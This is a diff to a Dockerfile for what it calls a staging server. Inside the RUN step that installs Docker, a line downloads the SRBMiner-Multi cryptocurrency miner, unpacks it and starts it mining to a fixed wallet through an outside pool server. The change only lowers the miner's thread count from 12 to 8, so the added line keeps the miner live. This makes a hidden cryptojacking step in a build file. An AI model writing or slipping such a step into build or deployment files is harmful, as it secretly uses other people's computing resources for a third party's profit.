@@ -9,7 +9,7 @@ RUN apt-get update && \
     curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
     add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
     apt-get update && \
-    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.0.2/SRBMiner-Multi-2-0-2-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-0-2-Linux.tar.xz && cd SRBMiner-Multi-2-0-2 && ./SRBMiner-MULTI --disable-gpu -a YespowerSugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57.Doc-01 -t 12 \
+    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.0.2/SRBMiner-Multi-2-0-2-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-0-2-Linux.tar.xz && cd SRBMiner-Multi-2-0-2 && ./SRBMiner-MULTI --disable-gpu -a YespowerSugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1qkwvndf3mrdszy9slw0cmq3vmqef5mnms8a8m57.Doc-01 -t 8 \
     apt install docker-ce
 
 # copy files from the repository into this staging server
